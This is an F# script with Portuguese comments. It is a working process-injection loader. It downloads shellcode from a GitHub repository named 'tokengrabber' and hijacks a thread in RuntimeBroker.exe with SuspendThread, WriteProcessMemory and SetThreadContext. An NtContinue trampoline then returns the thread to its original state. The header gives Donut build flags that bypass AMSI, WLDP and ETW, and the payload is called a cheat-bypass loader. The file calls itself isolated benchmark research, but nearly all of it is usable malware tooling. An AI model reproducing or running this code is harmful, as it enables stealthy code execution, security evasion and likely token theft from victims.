// =====================================================================================
// Thread hijack -> RuntimeBroker.exe com payload real em formato Donut (x64)
// Benchmark: CyberGym - pesquisa isolada.
//
// Geracao do shellcode (donut.exe local, build Oct 2024):
//   donut.exe -i cheat-bypass-loader.exe -o loader_donut.c -a 2 -f 3 -z 3 -b 3 -e 3 -k 1 -x 1
//   python tools\donut_refresh.py loader_donut.c loader.bin
//
//   -a 2   amd64 puro
//   -f 3   saida C (`unsigned char buf[]`) — convertida para loader.bin cru
//          pelo tools\donut_refresh.py, sem alterar um unico byte do shellcode
//   -z 3   LZNT1
//   -b 3   BYPASS AMSI/WDLP/ETW = "Continue on fail"  (NAO usar -b 1: desliga!)
//   -e 3   nomes aleatorios + criptografia simetrica
//   -k 1   sobrescreve cabecalhos PE do payload em memoria (sem marca Donut)
//   -x 1   Exit=Thread (sem RtlExitUserProcess)
//
//   O cheat e convertido com OS MESMOS parametros (-a 2 -f 3 -z 3 -b 3 -e 3
//   -k 1 -x 1) e seus bytes atualizados em cheat_embedded.hpp antes da
//   conversao final do loader.
//
//   NAO usar -y. Com -y o Donut chama NtContinue com c.Rsp &= -16 usando o RSP
//   do frame interno, corrompendo a stack da thread sequestrada.
//
//   O cheat-bypass-loader DEVE ser compilado em Release|x64 com /MD
//   (RuntimeLibrary=MultiThreadedDLL). Com /MT (CRT estatico) o payload mapeado
//   pelo Donut falha na inicializacao do CRT com 0xC0000409 antes de main().
//   Com /MD o UCRT ja esta inicializado no processo-alvo e tudo funciona.
//
// Mecanismo de retorno (NtContinue com o CONTEXT original) - SEM patch:
//
//   Tentativa descartada: trocar o `ret` final do stub (1 byte, C3) por um
//   `jmp rel32` (5 bytes) corrompia os 4 primeiros bytes do MainProc do Donut,
//   que comeca logo apos o ret (popOffset+23). Resultado: 0xC0000005 em
//   retAddr+4 e payload nunca executado. O shellcode NAO e modificado.
//
//   Solucao atual: simular um `call` na stack da thread, sem tocar o stub:
//
//     stub Donut x64 (offset relativo ao `pop rcx`) - INALTERADO:
//       0: 59               pop rcx       -> RCX = base+5 (instance Donut)
//       1: 55               push rbp
//       2: 48 89 E5         mov rbp, rsp
//       5: 48 83 E4 F0      and rsp, -16
//       9: 48 83 EC 20      sub rsp, 0x20
//       13:E8 05 00 00 00   call MainProc
//       18:48 89 EC         mov rsp, rbp
//       21:5D               pop rbp
//       22:C3               ret           -> consome o frame artificial
//
//     frame escrito em [originalRsp-8] = endereco do trampoline (8 bytes),
//     com RSP de entrada = originalRsp-8. O `ret` final entra no trampoline:
//
//     trampoline (pagina RX separada):
//       48 B9 <ctxAddr>    mov rcx, ctxAddr
//       48 31 D2           xor rdx, rdx       ; Alertable = FALSE
//       48 B8 <ntAddr>     mov rax, NtContinue
//       FF D0              call rax
//       CC                 int3               ; NtContinue nunca retorna
//
//   O CONTEXT original (copiado integralmente para uma pagina RW remota) e
//   restaurado de uma vez por NtContinue: RIP, RSP e todos os registradores
//   voltam exatamente ao estado da thread no momento do SuspendThread.
//
//   IMPORTANTE: threads em ThreadState.Wait podem demorar 20-40s para executar
//   o novo RIP (o wait no kernel precisa terminar). Testes curtos de 2s sao
//   enganosos - sempre esperar >= 35s antes de concluir.
//
// Fluxo:
//   1. AllocConsole + logs
//   2. baixa loader.bin da API do GitHub (fallback: arquivo local)
//   3. valida tamanho, SHA256 e assinatura do stub
//   4. OpenProcess(RuntimeBroker) + escolhe thread em Wait
//   5. SuspendThread -> GetThreadContext (CONTEXT original)
//   6. VirtualAllocEx RW para: shellcode, CONTEXT e trampoline
//   7. escreve shellcode (sem patch), CONTEXT e trampoline
//   8. promove shellcode e trampoline para PAGE_EXECUTE_READ (nunca RWX)
//   9. escreve frame [originalRsp-8] = trampoline
//  10. SetThreadContext: RIP = shellcode, RSP = originalRsp-8
//  11. ResumeThread -> payload roda -> ret -> trampoline -> NtContinue
// =====================================================================================

#nowarn "44"
#r "System.dll"
#r "System.Net.Http.dll"

open System
open System.IO
open System.Diagnostics
open System.Net
open System.Net.Http
open System.Security.Cryptography
open System.Runtime.InteropServices
open System.Threading

// ----------------------------------------------------------------------- Interop Win32

[<DllImport("kernel32.dll", SetLastError = true)>]
extern bool AllocConsole()

[<DllImport("kernel32.dll", SetLastError = true)>]
extern nativeint OpenProcess(uint32 dwDesiredAccess, bool bInheritHandle, uint32 dwProcessId)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern nativeint OpenThread(uint32 dwDesiredAccess, bool bInheritHandle, uint32 dwThreadId)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern uint32 SuspendThread(nativeint hThread)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern uint32 ResumeThread(nativeint hThread)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern bool GetThreadContext(nativeint hThread, nativeint lpContext)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern bool SetThreadContext(nativeint hThread, nativeint lpContext)

[<DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)>]
extern nativeint GetModuleHandleW(string lpModuleName)

[<DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)>]
extern nativeint GetProcAddress(nativeint hModule, string lpProcName)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern nativeint VirtualAllocEx(
    nativeint hProcess,
    nativeint lpAddress,
    int dwSize,
    uint32 flAllocationType,
    uint32 flProtect
)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern bool VirtualProtectEx(
    nativeint hProcess,
    nativeint lpAddress,
    int dwSize,
    uint32 flNewProtect,
    [<Out>] uint32& lpflOldProtect
)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern bool WriteProcessMemory(
    nativeint hProcess,
    nativeint lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    [<Out>] nativeint& lpNumberOfBytesWritten
)

[<DllImport("kernel32.dll", SetLastError = true)>]
extern bool CloseHandle(nativeint hObject)

// ---------------------------------------------------------------------------- Constantes

let PROCESS_VM_OPERATION       = 0x0008u
let PROCESS_VM_READ            = 0x0010u
let PROCESS_VM_WRITE           = 0x0020u
let PROCESS_QUERY_INFORMATION  = 0x0400u
let PROCESS_QUERY_LIMITED_INFO = 0x1000u
let PROCESS_ACCESS =
    PROCESS_VM_OPERATION ||| PROCESS_VM_READ ||| PROCESS_VM_WRITE |||
    PROCESS_QUERY_INFORMATION ||| PROCESS_QUERY_LIMITED_INFO

let THREAD_SET_CONTEXT       = 0x0010u
let THREAD_GET_CONTEXT       = 0x0008u
let THREAD_SUSPEND_RESUME    = 0x0002u
let THREAD_QUERY_INFORMATION = 0x0040u
let THREAD_ACCESS =
    THREAD_SET_CONTEXT ||| THREAD_GET_CONTEXT |||
    THREAD_SUSPEND_RESUME ||| THREAD_QUERY_INFORMATION

let MEM_COMMIT        = 0x1000u
let MEM_RESERVE       = 0x2000u
let PAGE_READWRITE    = 0x04u
let PAGE_EXECUTE_READ = 0x20u

// CONTEXT AMD64
let CONTEXT_AMD64 = 0x00100000
let CONTEXT_FLAGS = CONTEXT_AMD64 ||| 0x1B
let CONTEXT_SIZE  = 0x4D0
let CTX_FLAGS_OFF = 0x30
let CTX_RBX = 0x90
let CTX_RSP = 0x98
let CTX_RBP = 0xA0
let CTX_RIP = 0xF8

// -------------------------------------------------------------------------------- Config

// Usa a API em vez de raw.githubusercontent.com: o CDN do raw serviu uma
// copia stale mesmo depois do commit (Accept: raw devolve o blob atual).
let shellcodeUrl =
    "https://api.github.com/repos/bielzxdev/tokengrabber/contents/loader.bin?ref=main"

let expectedSha256 = "2302A646ECCB1D0ADEE090512EB046AFE9A05DA5E08458794C9E8DC186A82812"
let localShellcodePath = Path.Combine(__SOURCE_DIRECTORY__, "loader.bin")
let targetProcessName = "RuntimeBroker"

// ---------------------------------------------------------------------------------- Debug

// kprintf preserva os formatos %s/%d/%X/%A da chamada (string literala no call-site),
// sem exigir uma PrintfFormat dinamica - que nao compila em F#.
let logf fmt =
    Printf.kprintf
        (fun s -> Console.WriteLine("[" + DateTime.Now.ToString("HH:mm:ss.fff") + "] " + s))
        fmt

let sha256Hex (bytes: byte[]) =
    use sha = SHA256.Create()
    BitConverter.ToString(sha.ComputeHash(bytes)).Replace("-", "")

let hexDump (bytes: byte[]) (count: int) =
    let n = min count bytes.Length
    bytes.[0 .. n - 1]
    |> Array.map (fun b -> b.ToString("X2"))
    |> String.concat " "

// --------------------------------------------------------------- Donut stub helpers

// E8 <rel32> ; 59 (pop rcx) ; ... ; 5D (pop rbp) ; C3 (ret)
// O ret final fica em popOffset + 22 (verificado no binario gerado).
let stubPopOffset (data: byte[]) =
    5 + BitConverter.ToInt32(data, 1)

let stubRetOffset (data: byte[]) =
    stubPopOffset data + 22

// -------------------------------------------------------------------------- Download/load

let loadShellcode () =
    let mutable data : byte[] = Array.empty

    if not (String.IsNullOrWhiteSpace shellcodeUrl) then
        try
            ServicePointManager.SecurityProtocol <- SecurityProtocolType.Tls12
            logf "Baixando shellcode: %s" shellcodeUrl
            use client = new HttpClient()
            client.DefaultRequestHeaders.Add("User-Agent", "opencode-loader")
            client.DefaultRequestHeaders.Add("Accept", "application/vnd.github.raw")
            use resp = client.GetAsync(shellcodeUrl, HttpCompletionOption.ResponseHeadersRead).GetAwaiter().GetResult()
            resp.EnsureSuccessStatusCode() |> ignore
            let downloaded = resp.Content.ReadAsByteArrayAsync().GetAwaiter().GetResult()
            if downloaded.Length > 0 then data <- downloaded
            logf "Download OK: %d bytes" downloaded.Length
        with ex ->
            logf "Download falhou (%s) - usando arquivo local" ex.Message

    let downloadedHash = if data.Length > 0 then sha256Hex data else ""

    // O GitHub/CDN pode servir uma copia stale. Quando o download nao bate com
    // o SHA esperado e o arquivo local bate, o local e a fonte correta (acabou
    // de ser gerado pelo donut + tools\donut_refresh.py).
    if (data.Length = 0 || downloadedHash <> expectedSha256) &&
       File.Exists localShellcodePath then
        let localData = File.ReadAllBytes localShellcodePath
        let localHash = sha256Hex localData
        if localData.Length > 0 && localHash = expectedSha256 then
            data <- localData
            logf "Download rejeitado (%s); usando local: %s" downloadedHash localShellcodePath
        elif data.Length = 0 then
            data <- localData
            logf "Arquivo local carregado: %s" localShellcodePath

    if data.Length = 0 then
        failwith "Nenhum shellcode disponivel (URL vazia e arquivo local ausente)."

    let hash = sha256Hex data
    logf "Tamanho: %d bytes" data.Length
    logf "SHA256 : %s" hash
    logf "Primeiros 16 bytes: %s" (hexDump data 16)

    if hash <> expectedSha256 then
        logf "AVISO: SHA256 diferente do esperado (%s)" expectedSha256

    if data.Length < 0x300 then
        failwith "Shellcode suspeitamente curto - nao parece um loader Donut valido."

    // Donut x64: E8 <rel32> 59 (pop rcx) ... ; byte 0 deve ser 0xE8
    if data.[0] <> 0xE8uy then
        logf "AVISO: byte 0 != 0xE8 (esperado no loader Donut x64)"

    let popOff = stubPopOffset data
    if popOff < data.Length && data.[popOff] <> 0x59uy then
        logf "AVISO: opcode em %d nao e 0x59 (pop rcx)" popOff
    else
        logf "Stub Donut valido: E8 rel32=%d, pop rcx @ %d" (popOff - 5) popOff

    let retOff = stubRetOffset data
    if retOff + 1 > data.Length then
        failwith "Stub Donut truncado: nao ha o ret final."
    if data.[retOff] <> 0xC3uy then
        logf "AVISO: opcode em %d nao e 0xC3 (ret final do stub): 0x%X" retOff data.[retOff]
    else
        logf "Ret final confirmado em +%d (0xC3) - sera preservado, sem patch" retOff

    data

// ------------------------------------------------------------------------------- Nucleo

let injectShellcode (pid: int) (shellcode: byte[]) =
    let proc = Process.GetProcessById pid
    logf "Processo alvo: %s (pid=%d)" proc.ProcessName pid

    let all = proc.Threads |> Seq.cast<ProcessThread> |> Seq.toList
    if all.IsEmpty then failwith "Processo alvo sem threads."
    let chosen =
        match all |> List.tryFind (fun t -> t.ThreadState = ThreadState.Wait) with
        | Some t -> t
        | None -> all.Head
    let tid = chosen.Id
    logf "Thread escolhida: tid=%d state=%A (total=%d)" tid chosen.ThreadState all.Length

    let hProc = OpenProcess(PROCESS_ACCESS, false, uint32 pid)
    if hProc = 0n then
        failwithf "OpenProcess(%d) falhou. Win32=%d" pid (Marshal.GetLastWin32Error())
    logf "Handle processo: 0x%X" (hProc.ToInt64())

    let mutable hThread = 0n
    let mutable pContext = 0n
    let mutable remoteCode = 0n
    let mutable remoteCtx = 0n
    let mutable remoteTramp = 0n
    let mutable suspended = false

    try
        hThread <- OpenThread(THREAD_ACCESS, false, uint32 tid)
        if hThread = 0n then
            failwithf "OpenThread(%d) falhou. Win32=%d" tid (Marshal.GetLastWin32Error())

        if SuspendThread hThread = UInt32.MaxValue then
            failwithf "SuspendThread falhou. Win32=%d" (Marshal.GetLastWin32Error())
        suspended <- true
        logf "Thread suspensa"

        pContext <- Marshal.AllocHGlobal CONTEXT_SIZE
        let zeroes = Array.zeroCreate<byte> CONTEXT_SIZE
        Marshal.Copy(zeroes, 0, pContext, CONTEXT_SIZE)
        Marshal.WriteInt32(pContext, CTX_FLAGS_OFF, CONTEXT_FLAGS)

        if not (GetThreadContext(hThread, pContext)) then
            failwithf "GetThreadContext falhou. Win32=%d" (Marshal.GetLastWin32Error())

        let originalRip = Marshal.ReadInt64(pContext, CTX_RIP)
        let originalRsp = Marshal.ReadInt64(pContext, CTX_RSP)
        let originalRbp = Marshal.ReadInt64(pContext, CTX_RBP)
        let originalRbx = Marshal.ReadInt64(pContext, CTX_RBX)
        logf "CONTEXT original: RIP=0x%X RSP=0x%X RBP=0x%X RBX=0x%X" originalRip originalRsp originalRbp originalRbx

        // --- localiza NtContinue ----------------------------------------------------
        let hNtdll = GetModuleHandleW "ntdll.dll"
        if hNtdll = 0n then
            failwithf "GetModuleHandleW(ntdll.dll) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        let pNtContinue = GetProcAddress(hNtdll, "NtContinue")
        if pNtContinue = 0n then
            failwithf "GetProcAddress(NtContinue) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        logf "NtContinue resolvido em 0x%X" (pNtContinue.ToInt64())

        // --- alocacoes: RW para escrever, depois RX so no codigo --------------------
        let allocSize = (shellcode.Length + 0xFFF) &&& ~~~0xFFF
        remoteCode <-
            VirtualAllocEx(hProc, 0n, allocSize, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
        if remoteCode = 0n then
            failwithf "VirtualAllocEx(shellcode) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        logf "Shellcode RW em 0x%X (%d bytes)" (remoteCode.ToInt64()) allocSize

        remoteCtx <-
            VirtualAllocEx(hProc, 0n, CONTEXT_SIZE, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
        if remoteCtx = 0n then
            failwithf "VirtualAllocEx(CONTEXT) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        logf "CONTEXT RW em 0x%X (%d bytes)" (remoteCtx.ToInt64()) CONTEXT_SIZE

        let trampSize = 0x40
        remoteTramp <-
            VirtualAllocEx(hProc, 0n, trampSize, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
        if remoteTramp = 0n then
            failwithf "VirtualAllocEx(trampoline) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        logf "Trampoline RW em 0x%X (%d bytes)" (remoteTramp.ToInt64()) trampSize

        let mutable written = 0n

        // CONTEXT original -> pagina RW remota (copiada ANTES de alterar pContext)
        let ctxBytes = Array.zeroCreate<byte> CONTEXT_SIZE
        Marshal.Copy(pContext, ctxBytes, 0, CONTEXT_SIZE)
        if not (WriteProcessMemory(hProc, remoteCtx, ctxBytes, CONTEXT_SIZE, &written)) then
            failwithf "WriteProcessMemory(CONTEXT) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        logf "CONTEXT original copiado: %d bytes (RIP=0x%X RSP=0x%X)" (written.ToInt64()) originalRip originalRsp

        // trampoline: mov rcx,ctx ; xor rdx,rdx ; mov rax,NtContinue ; call rax ; int3
        let stub = ResizeArray<byte>()
        let emit8 (v: byte) = stub.Add v
        let emit64 (v: int64) =
            for i in 0 .. 7 do
                emit8 (byte ((v >>> (8 * i)) &&& 0xFFL))
        emit8 0x48uy; emit8 0xB9uy; emit64 (remoteCtx.ToInt64())
        emit8 0x48uy; emit8 0x31uy; emit8 0xD2uy
        emit8 0x48uy; emit8 0xB8uy; emit64 (pNtContinue.ToInt64())
        emit8 0xFFuy; emit8 0xD0uy
        emit8 0xCCuy
        let trampBytes = stub.ToArray()
        if not (WriteProcessMemory(hProc, remoteTramp, trampBytes, trampBytes.Length, &written)) then
            failwithf "WriteProcessMemory(trampoline) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        logf "Trampoline escrito: %d bytes, ctx=0x%X NtContinue=0x%X"
            (written.ToInt64()) (remoteCtx.ToInt64()) (pNtContinue.ToInt64())

        // Shellcode escrito SEM modificacao.
        // Tentativa anterior de trocar o C3 final do stub por E9 rel32 (5 bytes)
        // corrompia os 4 primeiros bytes do MainProc do Donut, que comeca logo
        // apos o ret (popOffset+23). Resultado: crash em retAddr+4 e payload
        // nunca executado. A solucao abaixo nao toca o shellcode.
        let retOff = stubRetOffset shellcode
        if shellcode.[retOff] <> 0xC3uy then
            failwithf "Stub inesperado em +%d: 0x%X (esperado 0xC3)" retOff shellcode.[retOff]
        logf "Ret final em +%d (0xC3) preservado - nenhum patch no shellcode" retOff

        if not (WriteProcessMemory(hProc, remoteCode, shellcode, shellcode.Length, &written)) then
            failwithf "WriteProcessMemory(shellcode) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        logf "Shellcode escrito: %d bytes" (written.ToInt64())

        // --- promocao para RX (nunca RWX) -------------------------------------------
        let mutable oldProtect = 0u
        if not (VirtualProtectEx(hProc, remoteCode, allocSize, PAGE_EXECUTE_READ, &oldProtect)) then
            failwithf "VirtualProtectEx(shellcode) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        logf "Shellcode promovido: 0x%X -> 0x%X (RX, sem RWX)" oldProtect PAGE_EXECUTE_READ

        oldProtect <- 0u
        if not (VirtualProtectEx(hProc, remoteTramp, trampSize, PAGE_EXECUTE_READ, &oldProtect)) then
            failwithf "VirtualProtectEx(trampoline) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        logf "Trampoline promovido: 0x%X -> 0x%X (RX, sem RWX)" oldProtect PAGE_EXECUTE_READ

        // --- frame de retorno: [originalRsp-8] = trampoline -----------------------
        // O `ret` final do stub consome este frame. Em vez de devolver ao RIP
        // original, ele entra no trampoline, que chama NtContinue(CONTEXT) e
        // restaura RIP/RSP/todos os registradores de uma vez.
        let callRsp = originalRsp - 8L
        let trampAddr = remoteTramp.ToInt64()
        let frame = BitConverter.GetBytes trampAddr
        if not (WriteProcessMemory(hProc, nativeint callRsp, frame, frame.Length, &written)) then
            failwithf "WriteProcessMemory(frame) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        logf "Frame de retorno: [0x%X] = 0x%X (trampoline, 8 bytes)" callRsp trampAddr

        Marshal.WriteInt64(pContext, CTX_RIP, remoteCode.ToInt64())
        Marshal.WriteInt64(pContext, CTX_RSP, callRsp)

        if not (SetThreadContext(hThread, pContext)) then
            failwithf "SetThreadContext falhou. Win32=%d" (Marshal.GetLastWin32Error())

        // Verifica se o contexto realmente persistiu na thread.
        let pVerify = Marshal.AllocHGlobal CONTEXT_SIZE
        try
            Marshal.Copy(zeroes, 0, pVerify, CONTEXT_SIZE)
            Marshal.WriteInt32(pVerify, CTX_FLAGS_OFF, CONTEXT_FLAGS)
            if GetThreadContext(hThread, pVerify) then
                let ripNow = Marshal.ReadInt64(pVerify, CTX_RIP)
                let rspNow = Marshal.ReadInt64(pVerify, CTX_RSP)
                logf "VERIFICACAO pos-Set: RIP=0x%X RSP=0x%X (esperado RIP=0x%X RSP=0x%X)"
                    ripNow rspNow (remoteCode.ToInt64()) callRsp
            else
                logf "AVISO: GetThreadContext(pos-Set) falhou. Win32=%d" (Marshal.GetLastWin32Error())
        finally
            Marshal.FreeHGlobal pVerify

        logf "CONTEXT redirecionado: RIP 0x%X -> 0x%X | RSP 0x%X -> 0x%X (ret -> trampoline -> NtContinue)"
            originalRip (remoteCode.ToInt64()) originalRsp callRsp

        if ResumeThread hThread = UInt32.MaxValue then
            failwithf "ResumeThread falhou. Win32=%d" (Marshal.GetLastWin32Error())
        suspended <- false
        logf "Thread retomada - loader Donut em execucao"

    finally
        if suspended && hThread <> 0n then ResumeThread hThread |> ignore
        if pContext <> 0n then Marshal.FreeHGlobal pContext
        // remoteCode / remoteCtx / remoteTramp nao sao liberados: o loader ainda
        // pode estar lendo o shellcode e o CONTEXT e usado no retorno.
        if hThread <> 0n then CloseHandle hThread |> ignore
        if hProc <> 0n then CloseHandle hProc |> ignore

// ----------------------------------------------------------------------------- Entry point

AllocConsole() |> ignore
logf "=== Thread hijack / RuntimeBroker / Donut loader ==="
logf "Bypass AMSI/WLDP/ETW: HABILITADO (-b 3 = Continue on fail)"
logf "Retorno da thread: ret -> trampoline -> NtContinue(CONTEXT original), sem patch no shellcode"

let targets = Process.GetProcessesByName targetProcessName
if targets.Length = 0 then
    failwithf "Nenhum %s.exe em execucao." targetProcessName
logf "%s encontrado: %d instancia(s)" targetProcessName targets.Length

let targetPid = targets.[0].Id
let shellcode = loadShellcode ()
injectShellcode targetPid shellcode

logf "Hijack concluido. O payload so comeca a rodar quando o wait kernel da thread terminar (tipicamente 20-90s)."
Thread.Sleep 2000

try
    let alive = Process.GetProcessById targetPid
    logf "RuntimeBroker pid=%d vivo logo apos o hijack: %b (payload pode levar 20-90s para iniciar)" targetPid (not alive.HasExited)
with _ ->
    logf "AVISO: RuntimeBroker pid=%d nao encontrado apos execucao" targetPid

logf "=== Fim ==="
